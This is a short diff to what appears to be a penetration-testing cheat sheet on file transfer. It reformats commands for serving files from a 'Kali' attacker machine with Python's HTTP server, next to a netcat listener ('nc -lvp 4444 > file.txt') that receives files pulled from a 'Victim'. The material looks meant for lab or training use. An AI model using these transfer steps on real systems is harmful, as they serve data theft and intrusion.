@@ -53,7 +53,11 @@ nc -lvp 4444 > file.txt
 
 *Kali:*
 ```
-python3 -m http.server 8888``` or ```python -m SimpleHTTPServer 8888
+python3 -m http.server 8888 
+```
+or
+```
+python -m SimpleHTTPServer 8888
 ```
 
 *Victim:* 
